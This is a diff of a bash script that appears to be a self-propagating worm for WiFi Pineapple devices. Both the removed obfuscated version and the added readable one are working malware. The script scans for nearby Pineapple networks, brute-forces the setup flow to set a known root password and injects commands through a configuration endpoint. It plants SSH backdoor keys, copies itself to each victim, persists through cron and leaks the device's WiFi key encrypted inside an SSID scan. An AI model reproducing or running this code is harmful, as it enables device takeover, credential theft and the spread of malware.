@@ -1,88 +1,122 @@
-#!/bin/bash
-a2=`uci get wireless.@wifi-iface[0].ssid`
+
+creds="username=root&password=pineapplesareyummy&login="
+sessid="tospovirus"
+token="_csrfToken=$(printf "$sessid" | openssl sha1 | egrep -o "[0-9a-f][0-9a-f]+")"
+sshoptions="-oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa"
+
+
+self=`uci get wireless.@wifi-iface[0].ssid`
+
 init() {
-if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
-then
-sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
-uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
-uci commit
-wifi
-sleep 3
-fi
-if [ ! -f /tospo/tospo_rsa.pub ]; then
-ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
-fi
-mkdir -p /root/.ssh
-touch /root/.ssh/authorized_keys
-grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
-if [ ! -f /pineapple/tvi ]; then ln -s /tospo/tvi /pineapple/tvp; fi
+	if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
+	then
+		sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
+		uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
+		uci commit
+		wifi
+		sleep 3
+	fi
+	if [ ! -f /tospo/tospo_rsa.pub ]; then
+		echo "Generating tospo ssh key..."
+		ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
+	fi
+	mkdir -p /root/.ssh
+	touch /root/.ssh/authorized_keys
+	grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
+
+	if [ ! -f /pineapple/tvi ]; then 
+		ln -s /tospo/tvi /pineapple/tvp; 
+	fi
 }
+
 pushstate() {
-uci export wireless > /tospo/w
-uci export network > /tospo/n
+	echo "Pushing state..."
+	uci export wireless > /tospo/w
+	uci export network > /tospo/n
 }
-popstate () {
-ifconfig br-lan 172.16.42.1 up
-ifconfig wlan0 up
-ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
-uci import -f /tospo/w && uci commit
-uci import -f /tospo/n && uci commit
-wifi
+
+popstate() {
+	echo "Popping state..."
+	ifconfig br-lan 172.16.42.1 up
+	ifconfig wlan0 up
+	ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
+	uci import -f /tospo/w && uci commit
+	uci import -f /tospo/n && uci commit
+	wifi
 }
+
 connect() {
-a3=$1
-ifconfig wlan1 up
-ifconfig br-lan 172.16.42.191 down
-ifconfig wlan0 down
-a5=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
-uci delete wireless.@wifi-iface[$a5].key
-uci delete wireless.@wifi-iface[$a5].encryption
-uci set wireless.@wifi-iface[$a5].network=wan
-uci set wireless.@wifi-iface[$a5].mode=sta
-uci set wireless.@wifi-iface[$a5].ssid="$a3"
-uci set wireless.@wifi-iface[$a5].hidden=0
-uci set wireless.radio1.channel=11
-uci commit wireless
-wifi
-sleep 3
-ifconfig wlan1 172.16.42.146
+	ssid=$1
+	echo "Connecting to $ssid..."
+	ifconfig wlan1 up
+	echo "Avoiding conflicts..."
+	ifconfig br-lan 172.16.42.191 down
+	ifconfig wlan0 down
+
+	echo "Guess at the client-mode interface..."
+	wid=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
+	echo "Stripping keys just in case..."
+	uci delete wireless.@wifi-iface[$wid].key
+	uci delete wireless.@wifi-iface[$wid].encryption
+	echo "Connect to the target network..."
+	uci set wireless.@wifi-iface[$wid].network=wan
+	uci set wireless.@wifi-iface[$wid].mode=sta
+	uci set wireless.@wifi-iface[$wid].ssid="$ssid"
+	uci set wireless.@wifi-iface[$wid].hidden=0
+	uci set wireless.radio1.channel=11
+	uci commit wireless
+	wifi
+	sleep 3
+	
+	ifconfig wlan1 172.16.42.146
 }
+
+
 post() {
-a4=`printf "$2" | wc -c`
-printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $a4\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
+	len=`printf "$2" | wc -c`
+	printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
 }
+
 bf() {
-a0=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
-for a7 in `seq 1 $1`
-do
-post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$a0" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$a0" | grep "success" && return 0
-done
-return 1
+	echo "Brute forcing..."
+	session=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -om1 '[0-9a-z]{32}'`
+	for n in `seq 1 $1`
+	do
+		echo "Trying $n time..."
+	        post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$session" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$session" | grep "success" && return 0
+	done
+	return 1
 }
 login() {
-a1="username=root&password=pineapplesareyummy&login="
-post '/includes/api/login.php' "$a1" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && return 1
-return 0
+	echo "Logging in..."
+	post '/includes/api/login.php' "$creds" "$sessid" | grep -i 'invalid username' && return 1
+	echo "Logged in Successfully!"
+	return 0
 }
+
 infect() {
-post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
-ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 "mkdir -p /tospo" && scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
+	post '/components/system/configuration/functions.php?execute=' "$token&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "$sessid"
+	ssh $sshoptions 172.16.42.1 "mkdir -p /tospo" && scp $sshoptions -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
 }
+
 persist() {
-ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
+	ssh $sshoptions 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
 }
+
 exfiltrate() {
-which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key" | cut -d"'" -f2 | openssl rsautl -encrypt -pubin -inkey /tospo/tvd.pub)" >/dev/null
+	which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key" | cut -d"'" -f2 | openssl rsautl -encrypt -pubin -inkey /tospo/tvd.pub)" >/dev/null
 }
+
 init
-exfiltrate
-for a6 in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$a2"`
+echo "Scanning for new devices..."
+for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
 do
-pushstate
-connect `echo $a6 | cut -d '"' -f 2`
-login || (bf 75 && login || popstate && break)
-infect
-persist
-popstate
-break
+	pushstate
+	connect `echo $net | cut -d '"' -f 2`
+	login || (bf 75 && login || popstate && break)
+	infect
+	persist
+	popstate
+	break
 done
+exfiltrate
